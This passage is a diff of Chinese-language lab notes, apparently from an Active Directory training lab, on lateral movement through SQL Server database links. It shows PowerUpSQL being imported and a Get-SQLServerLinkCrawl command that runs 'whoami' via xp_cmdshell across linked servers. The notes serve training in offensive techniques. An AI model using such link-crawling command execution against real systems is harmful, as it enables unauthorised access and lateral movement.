@@ -249,7 +249,7 @@ SQL Servers为横向移动提供了非常好的选项，因为域用户可以映
 数据库链接允许 SQL Server 访问外部数据源，如其他SQL Server和OLE DB 数据源
 如果数据库链接在 SQL 服务器之间，也就是链接的SQL 服务器，则可以执行存储过程，数据库链接甚至可以对跨林信任有效
 
-枚举当前账号是否对MSSQLSERVER有权限，收集信息
+枚举当前账号（student366）是否对MSSQLSERVER有权限，收集信息
 ```
 PS C:\ad\PowerUpSQL-master> Import-Module .\PowerUpSQL.psd1
 WARNING: The names of some imported commands from the module 'PowerUpSQL' include unapproved verbs that might make them
@@ -333,7 +333,7 @@ Links       :
 下面命令执行whoami命令，mysql实例(根据上面枚举到有权限的结果)指定```dcorp-mssql.dollarcorp.moneycorp.local```
 
 ```
-Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local,1433 -Query "exec master..xp_cmdshell 'whoami'"
+Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'whoami'"
 ```
 
 执行
